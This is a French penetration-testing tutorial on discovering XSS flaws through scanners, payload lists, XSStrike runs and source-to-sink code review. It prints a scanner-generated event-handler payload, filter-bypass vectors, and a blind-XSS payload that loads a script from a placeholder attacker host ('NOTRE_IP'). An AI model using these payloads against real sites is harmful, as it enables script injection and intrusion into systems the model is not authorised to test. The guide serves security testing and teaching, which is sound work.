# Découverte de vulnérabilités XSS

Identifier une faille XSS peut sembler trivial sur une application de test, mais sur un périmètre réel avec des dizaines de champs de saisie, des en-têtes HTTP et du JavaScript côté client, la détection devient un exercice méthodique. Cette page couvre les trois approches complémentaires : les scanners automatisés, le test manuel avec des listes de payloads, et la revue de code source.

## Pourquoi

Une XSS non détectée reste exploitable indéfiniment. Les scanners automatisés permettent de couvrir rapidement un grand nombre de points d'injection, mais ils génèrent des faux positifs et ratent certaines variantes (notamment les DOM XSS complexes). Le test manuel et la revue de code viennent compléter cette couverture pour atteindre un niveau de confiance acceptable.

{% hint style="info" %}
La détection XSS peut être aussi complexe que l'exploitation elle-même. Un scanner qui rapporte "rien trouvé" ne signifie pas que l'application est sûre.
{% endhint %}

## Comment ça marche

### Découverte automatisée

Les scanners de vulnérabilités web effectuent généralement deux types d'analyse :

| Type de scan | Fonctionnement | Ce qu'il détecte |
|---|---|---|
| **Scan passif** | Analyse le code côté client sans envoyer de requêtes supplémentaires | DOM XSS potentielles (sources et sinks JavaScript) |
| **Scan actif** | Injecte des payloads dans les paramètres et compare le rendu | Stored XSS, Reflected XSS |

**Scanners commerciaux**

Les outils commerciaux offrent généralement une meilleure précision, surtout quand il faut contourner des protections :

- **Nessus** : scanner réseau avec capacités web, détecte les XSS dans le cadre d'un audit plus large
- **Burp Suite Pro** : scanner intégré au proxy, très efficace pour les tests actifs avec gestion automatique des sessions
- **ZAP (OWASP)** : alternative open-source à Burp, avec scanner actif et passif intégrés

**Outils open-source spécialisés**

Pour des tests ciblés, plusieurs outils gratuits se concentrent exclusivement sur la détection XSS :

| Outil | Description | Point fort |
|---|---|---|
| **XSS Strike** | Analyseur de contexte avec génération intelligente de payloads | Analyse les réflexions et génère des payloads adaptés au contexte |
| **Brute XSS** | Test par force brute de payloads XSS | Simple d'utilisation, bonne couverture de payloads basiques |
| **XSSer** | Framework complet de test XSS | Options avancées (bypass WAF, encodage, vecteurs multiples) |

**Fonctionnement interne des scanners XSS**

Le principe reste le même pour tous ces outils :

1. Identifier les champs de saisie dans la page (formulaires, paramètres URL, en-têtes)
2. Envoyer une variété de payloads XSS dans chaque champ
3. Comparer le code source rendu pour vérifier si le payload apparaît tel quel
4. Évaluer si l'injection mène à une exécution effective du JavaScript

{% hint style="warning" %}
Un payload qui apparaît dans le code source rendu ne garantit pas une exécution. Des filtres côté navigateur, des Content-Security-Policy ou un encodage partiel peuvent bloquer l'exécution malgré la présence du payload dans le DOM. La vérification manuelle reste indispensable.
{% endhint %}

### Découverte manuelle

Quand les scanners ne suffisent pas (application avec authentification complexe, logique métier particulière, protections anti-bot), le test manuel prend le relais.

**Listes de payloads**

Plusieurs dépôts maintiennent des listes exhaustives de payloads XSS :

- **PayloadsAllTheThings** : collection organisée par type d'injection et contexte
- **PayloadBox** : listes massives de payloads bruts

Le principe consiste à copier chaque payload dans un champ de saisie et observer si une alerte JavaScript se déclenche. C'est efficace mais laborieux.

{% hint style="info" %}
Les points d'injection XSS ne se limitent pas aux formulaires HTML. Les en-têtes HTTP comme `Cookie`, `User-Agent` ou `Referer` peuvent aussi être vulnérables, dès lors que leur valeur est affichée quelque part dans l'application (page d'erreur, panneau d'administration, logs consultables).
{% endhint %}

**Pourquoi la plupart des payloads échouent**

Sur une application réelle, la grande majorité des payloads d'une liste ne fonctionneront pas, pour plusieurs raisons :

- Le payload est conçu pour un contexte d'injection spécifique (après une apostrophe, dans un attribut HTML, dans du CSS)
- Il vise un mécanisme de contournement qui n'est pas pertinent pour la cible
- Il utilise un vecteur (balise `<script>`, attribut `onerror`, style CSS) que l'application filtre
- L'encodage du payload ne correspond pas à celui attendu par l'application

C'est pour cette raison que tester des payloads un par un à la main n'est pas une méthode fiable sur un périmètre large.

**Scripts de test personnalisés**

Une approche plus efficace consiste à écrire un script Python qui automatise l'envoi de payloads et la comparaison du rendu. Cela permet d'adapter la logique au comportement spécifique de l'application cible (gestion des sessions, tokens CSRF, format de réponse). Cette approche demande plus de compétences, mais donne des résultats bien plus pertinents qu'un outil générique.

### Revue de code

La revue de code reste la méthode la plus fiable pour identifier des vulnérabilités XSS, car elle permet de comprendre exactement comment l'entrée utilisateur est traitée depuis sa réception jusqu'à son affichage.

**Identifier les Sources et les Sinks**

Le concept central est de tracer le flux de données entre la **Source** (l'endroit où l'entrée utilisateur est captée) et le **Sink** (la fonction qui écrit cette entrée dans le DOM).

Sources courantes en JavaScript :

```javascript
// Paramètres d'URL
document.URL
document.location
document.referrer
window.location.search
window.location.hash

// Champs de formulaire
document.getElementById('input').value
```

Sinks dangereux (fonctions qui écrivent du contenu brut dans le DOM) :

```javascript
// JavaScript natif
document.write()
document.writeln()
element.innerHTML
element.outerHTML

// jQuery
$('#elem').html()
$('#elem').append()
$('#elem').after()
$('#elem').prepend()
```

Si un Sink reçoit directement une valeur provenant d'une Source sans sanitization intermédiaire, la page est vulnérable à une XSS (typiquement DOM-based).

{% hint style="success" %}
La revue de code est particulièrement utile pour les applications web populaires et matures. Leurs développeurs passent déjà leurs produits dans des scanners de vulnérabilités avant publication, donc les failles détectables par des outils automatisés sont généralement corrigées. Les XSS qui survivent aux releases sont celles que seule une lecture attentive du code peut révéler.
{% endhint %}

## En pratique

### Utiliser XSS Strike depuis Exegol

Installation et premier scan :

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

Lancer un scan sur un paramètre GET :

```bash
python xsstrike.py -u "http://<IP_CIBLE>:<PORT>/page.php?param=test"
```

Exemple de sortie :

```bash
XSStrike v3.1.5

[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[!] Testing parameter: param
[!] Reflections found: 1
[~] Analysing reflections
[~] Generating payloads
[!] Payloads generated: 3072
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()>
[!] Efficiency: 100
[!] Confidence: 10
[?] Would you like to continue scanning? [y/N]
```

**Lecture de la sortie :**

| Élément | Signification |
|---|---|
| `WAF Status: Offline` | Aucun WAF détecté (ou WAF transparent) |
| `Reflections found: 1` | L'entrée est reflétée une fois dans la réponse |
| `Payloads generated: 3072` | Nombre de payloads générés selon le contexte d'injection |
| `Efficiency: 100` | Le payload a 100% de chances de s'exécuter selon l'analyse |
| `Confidence: 10` | Score de confiance maximal (échelle de 1 à 10) |

### Scanner plusieurs paramètres

Pour une URL avec plusieurs paramètres, XSS Strike teste chacun séquentiellement :

```bash
python xsstrike.py -u "http://<IP_CIBLE>:<PORT>/form.php?nom=test&email=test&msg=test"
```

L'outil rapportera pour chaque paramètre s'il a trouvé des réflexions et des payloads fonctionnels, ce qui permet d'identifier rapidement le ou les paramètres vulnérables parmi un formulaire complexe.

### Compléter avec Burp Suite

Même sans la version Pro, Burp Suite Community permet de faciliter la découverte manuelle :

1. Intercepter la requête contenant le paramètre à tester
2. L'envoyer dans le Repeater (`Ctrl+R`)
3. Modifier la valeur du paramètre avec différents payloads
4. Observer la réponse pour détecter les réflexions et l'absence de filtrage

## Pièges et galères

- **Faux positifs des scanners** : un payload reflété dans la source ne signifie pas qu'il s'exécute. Vérifier toujours manuellement dans un navigateur.
- **Champs non évidents** : les en-têtes HTTP (`User-Agent`, `Referer`) sont souvent oubliés lors des tests. Si l'application affiche ces valeurs quelque part (logs, dashboard admin), ils deviennent des vecteurs d'attaque.
- **Protection côté client uniquement** : un champ qui valide le format en JavaScript (regex sur l'email par exemple) peut être contourné en envoyant la requête directement via Burp ou curl. La validation front-end n'est pas une protection contre l'injection.
- **Contexte d'injection** : un payload qui fonctionne dans un champ de texte libre ne marchera pas dans un attribut HTML ou un bloc JavaScript. Il faut adapter le payload au contexte (fermer une balise, échapper un attribut, sortir d'une chaîne JS).
- **WAF et filtres** : certains WAF bloquent les payloads classiques (`<script>`, `alert()`) mais laissent passer des variantes encodées ou des vecteurs alternatifs (`<img onerror=...>`, `<svg onload=...>`).

## Retour terrain

Sur un audit réel, la stratégie la plus efficace combine les trois approches dans cet ordre :

1. **Scan automatisé rapide** avec ZAP ou XSS Strike pour identifier les points d'injection évidents
2. **Test manuel ciblé** sur les champs que le scanner n'a pas pu tester (formulaires avec CSRF, champs derrière une authentification, en-têtes HTTP)
3. **Revue de code** sur les zones sensibles identifiées, pour comprendre le traitement exact de l'entrée et construire un payload sur mesure

Les vulnérabilités les plus intéressantes en pentest sont souvent les Blind XSS dans des formulaires de contact ou de support. L'entrée est traitée et affichée dans un panneau d'administration auquel on n'a pas accès. La détection passe alors par un callback vers un serveur contrôlé (on injecte un `<script src=http://NOTRE_IP/champ></script>` et on vérifie quel champ déclenche la requête).

## Mémo express

| Approche | Quand l'utiliser | Limite principale |
|---|---|---|
| **Scanners automatisés** (Nessus, Burp Pro, ZAP) | Première passe sur un périmètre large | Faux positifs, rate les DOM XSS complexes |
| **Outils spécialisés** (XSS Strike, XSSer) | Test ciblé d'un paramètre suspect | Ne gère pas toujours les sessions complexes |
| **Listes de payloads** (PayloadsAllTheThings) | Quand on connaît le contexte d'injection | Laborieux sans automatisation |
| **Script Python custom** | Application avec logique métier spécifique | Demande du temps de développement |
| **Revue de code** | Applications matures, DOM XSS, audit approfondi | Nécessite l'accès au code source |
| **Blind XSS callback** | Formulaires dont la sortie est invisible | Nécessite un serveur d'écoute externe |

{% hint style="success" %}
En pentest, documenter chaque payload testé et son résultat permet de justifier la couverture de test dans le rapport final. Un tableau "paramètre / payload / résultat" est un livrable apprécié des clients.
{% endhint %}

***
